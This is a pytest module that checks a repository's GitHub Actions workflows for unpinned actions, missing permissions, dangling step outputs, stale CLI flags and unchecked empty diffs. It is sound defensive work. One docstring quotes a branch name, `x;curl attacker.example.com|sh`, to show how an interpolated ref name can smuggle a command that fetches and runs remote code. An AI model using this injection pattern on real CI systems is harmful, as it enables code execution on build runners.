"""Contracts for GitHub workflows, most of which have never executed.

Three of this repository's five workflows have never run once: `pr-sentinel.yml` and
`recursive-hardening.yml` fire on `pull_request` and `autonomous-triage.yml` on `issues`,
and in the repository's whole history there have been zero pull requests and zero issues.
Every commit went straight to `main`, so `ci.yml` accumulated 83 runs and the other three
accumulated none.

That is the repository's own signature defect at the level of process: a gate that has
never fired is indistinguishable from one that passes. Workflow code is worse than most,
because nothing else reads it — no linter resolves `python tools/x.py --flag` against that
script's argparse, and `actionlint` checks syntax rather than whether the command means
anything. These tests are what reads it.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOW_DIR = REPO_ROOT / ".github" / "workflows"
WORKFLOWS = sorted(WORKFLOW_DIR.glob("*.yml")) + sorted(WORKFLOW_DIR.glob("*.yaml"))

_SHA_PINNED = re.compile(r"^[^@]+@[0-9a-f]{40}$")
_EXPRESSION = re.compile(r"\$\{\{(.+?)\}\}", re.DOTALL)
_STEP_REF = re.compile(r"steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)")
_PY_INVOCATION = re.compile(r"\bpython3?\s+((?:tools|examples|benchmarks)/[^\s]+\.py)((?:\s+[^\s|>&;]+)*)")
_DIFF_TO_FILE = re.compile(r"git\s+diff\b[^\n]*?>\s*(\S+)")
_REDIRECT_TARGET = re.compile(r">\s*(/\S+)")


def _load(path: Path) -> dict[str, Any]:
    """Parse one workflow document."""
    return yaml.safe_load(path.read_text(encoding="utf-8"))


def _steps(path: Path) -> list[tuple[str, dict[str, Any]]]:
    """Return every (job name, step) pair in one workflow."""
    document = _load(path)
    return [
        (job_name, step)
        for job_name, job in (document.get("jobs") or {}).items()
        for step in (job.get("steps") or [])
    ]


def test_at_least_one_workflow_is_present() -> None:
    """A suite that silently found no workflows would pass every test below vacuously."""
    assert len(WORKFLOWS) >= 5


def _is_unpinned_action(uses: str | None) -> bool:
    """Report whether a GitHub Action reference is unpinned to a full SHA."""
    if not uses or uses.startswith("./"):
        return False
    return not bool(_SHA_PINNED.match(uses))


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_action_is_pinned_to_a_commit_sha(path: Path) -> None:
    """A moving tag is a dependency that can change under a workflow nobody ever runs."""
    unpinned = [step["uses"] for _, step in _steps(path) if _is_unpinned_action(step.get("uses"))]
    assert unpinned == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_workflow_declares_least_privilege_permissions(path: Path) -> None:
    """An undeclared `permissions` block inherits whatever the repository default is."""
    assert "permissions" in _load(path)


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_no_run_step_interpolates_a_workflow_expression(path: Path) -> None:
    """Expressions are substituted into `run:` before the shell parses it.

    Git permits `;`, `$`, `(`, `)`, `|` and backticks in a ref name, so a branch called
    `x;curl attacker.example.com|sh` turns `git diff origin/${{ github.base_ref }}` into
    two commands on the runner. `autonomous-triage.yml` already routes the issue body
    through `env:` with a comment explaining exactly this; the rule was applied to one
    workflow and not the other two, which is the shape a never-executed file accumulates.

    Values reach `run:` through `env:`, where they are passed to the process rather than
    pasted into its source. That is GitHub's own hardening guidance and it is mechanical,
    so it needs no per-expression judgement about which context is attacker-controlled.
    """
    offenders = [
        f"{step.get('name', '<unnamed>')}: {match.strip()}"
        for _, step in _steps(path)
        if isinstance(step.get("run"), str)
        for match in _EXPRESSION.findall(step["run"])
    ]
    assert offenders == []


def _step_missing_scripts(step: dict[str, Any]) -> list[str]:
    """Find scripts invoked by a step that do not exist on disk."""
    body = step.get("run")
    if not isinstance(body, str):
        return []
    return [script for script, _ in _PY_INVOCATION.findall(body) if not (REPO_ROOT / script).is_file()]


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_script_a_workflow_runs_exists(path: Path) -> None:
    """A renamed script fails at minute three of a workflow, or never, if it never runs."""
    missing = [script for _, step in _steps(path) for script in _step_missing_scripts(step)]
    assert missing == []


def _dangling_step_refs_in_job(job_name: str, job: dict[str, Any]) -> list[str]:
    """Find step output references in a job that reference undeclared step IDs."""
    declared = {step["id"] for step in (job.get("steps") or []) if "id" in step}
    referenced = {ref for ref, _ in _STEP_REF.findall(yaml.safe_dump(job))}
    return [f"{job_name}:{ref}" for ref in sorted(referenced - declared)]


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_referenced_step_id_exists_in_its_job(path: Path) -> None:
    """`steps.typo.outputs.x` evaluates to empty rather than failing, so a condition silently inverts."""
    document = _load(path)
    jobs = (document.get("jobs") or {}).items()
    dangling = [ref for job_name, job in jobs for ref in _dangling_step_refs_in_job(job_name, job)]
    assert dangling == []


def _unwritten_outputs_in_job(job: dict[str, Any]) -> list[str]:
    """Find referenced outputs in a job that the referenced step never writes."""
    by_id = {step["id"]: step for step in (job.get("steps") or []) if "id" in step}
    unwritten: list[str] = []
    for ref, name in _STEP_REF.findall(yaml.safe_dump(job)):
        step = by_id.get(ref)
        if step is not None and not _writes_output(step, name):
            unwritten.append(f"{ref}.{name}")
    return unwritten


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_referenced_step_output_is_written_by_that_step(path: Path) -> None:
    """An output nobody writes is an empty string, and `if: ... > 0` on it is always false."""
    document = _load(path)
    jobs = (document.get("jobs") or {}).values()
    unwritten = [out for job in jobs for out in _unwritten_outputs_in_job(job)]
    assert sorted(set(unwritten)) == []


def _writes_output(step: dict[str, Any], name: str) -> bool:
    """Report whether a step actually produces the named output."""
    body = step.get("run") or ""
    script = (step.get("with") or {}).get("script", "")
    return f"{name}=" in body or f"setOutput('{name}'" in script or f'setOutput("{name}"' in script


def _step_cli_invocations(workflow_name: str, step: dict[str, Any]) -> list[tuple[str, str, tuple[str, ...]]]:
    """Extract CLI invocations from a single workflow step."""
    body = step.get("run")
    if not isinstance(body, str):
        return []
    joined = body.replace("\\\n", " ")
    return [
        (workflow_name, script, tuple(shlex.split(rest))) for script, rest in _PY_INVOCATION.findall(joined)
    ]


def _cli_invocations() -> list[tuple[str, str, tuple[str, ...]]]:
    """Return every (workflow, script, argv) a `run:` step invokes against repository tooling."""
    return [
        inv
        for path in WORKFLOWS
        for _, step in _steps(path)
        for inv in _step_cli_invocations(path.name, step)
    ]


def _workflow_param_id(val: Any) -> str:
    """Produce test identifier for parameterized CLI invocation."""
    return val if isinstance(val, str) else ""


def _missing_cli_flags(script: str, argv: tuple[str, ...]) -> list[str]:
    """Return command flags missing from the script or subcommand help output."""
    subcommand = [token for token in argv[:1] if not token.startswith("-")]
    flags = [token for token in argv if token.startswith("--")]
    help_text = _help(script, subcommand)
    return [flag for flag in flags if flag not in help_text]


@pytest.mark.parametrize("workflow,script,argv", _cli_invocations(), ids=_workflow_param_id)
def test_every_cli_contract_a_workflow_depends_on_still_exists(
    workflow: str, script: str, argv: tuple[str, ...]
) -> None:
    """Resolve each workflow's command line against the script's own argument parser.

    Nothing else does this. `actionlint` checks that the YAML and the shell are
    well-formed, not that `verify-hardening --diff-file --is-defect` is a command the tool
    accepts — so a renamed subcommand or a dropped flag is discovered when the workflow
    runs, which for three of these workflows has been never.
    """
    missing = _missing_cli_flags(script, argv)
    subcommand = [token for token in argv[:1] if not token.startswith("-")]
    assert missing == [], f"{workflow}: {script} {' '.join(subcommand)} rejects {missing}"


def _help(script: str, subcommand: list[str]) -> str:
    """Return the help text for a script, or for one of its subcommands."""
    # Fixed argv built from this repository's own files; no shell, no external input.
    proc = subprocess.run(
        [sys.executable, script, *subcommand, "--help"],
        cwd=REPO_ROOT,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
        env=dict(os.environ, COLUMNS="200"),
    )
    assert proc.returncode == 0, f"{script} {' '.join(subcommand)} --help failed: {proc.stderr[:300]}"
    return proc.stdout


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_a_generated_diff_is_checked_for_emptiness_before_it_is_judged(path: Path) -> None:
    """An empty input to a verifier is a broken range, not a clean result.

    `recursive-hardening.yml` ran `git diff origin/BASE...MERGE_SHA`. Once a pull request
    is merged its commit is an ancestor of the base, so that three-dot range has the merge
    commit as its own merge base and produces an empty diff — under squash, merge and
    rebase alike. The verifier read the empty patch as "AGENTS.md was not updated" and
    opened an issue accusing the author of skipping the hardening they had in fact done.
    On the real merge that exposed this, the broken range yielded 0 files and the correct
    one 12.

    The durable rule is not about that range. It is that a step which generates input for
    a judgement must distinguish "nothing matched" from "the query was wrong", because
    only one of those is a finding.
    """
    unchecked = [name for name, body in _jobs_with_diffs(path).items() if not _tests_emptiness(body)]
    assert unchecked == []


def _job_shell_body(job: dict[str, Any]) -> str:
    """Concatenate shell script lines for run steps in a job."""
    return "\n".join(step["run"] for step in (job.get("steps") or []) if isinstance(step.get("run"), str))


def _jobs_with_diffs(path: Path) -> dict[str, str]:
    """Return each job's concatenated shell, for the jobs that generate a diff file."""
    document = _load(path)
    bodies = {name: _job_shell_body(job) for name, job in (document.get("jobs") or {}).items()}
    return {name: body for name, body in bodies.items() if _DIFF_TO_FILE.search(body)}


def _tests_emptiness(body: str) -> bool:
    """Report whether a job checks the size of any file it wrote.

    Scoped to the job, not the step, and satisfied by any produced file rather than the
    diff itself. `pr-sentinel.yml` writes the changed-file list in one step, filters
    deleted paths into a second file in the next, and tests that one — which is a correct
    handling of an empty result, just not in the same step or on the same path. What must
    not happen is that no file the job produced is ever tested, which is the state
    `recursive-hardening.yml` was in when it accused an author of skipping hardening they
    had done.
    """
    return any(f"-s {target}" in body for target in _REDIRECT_TARGET.findall(body))
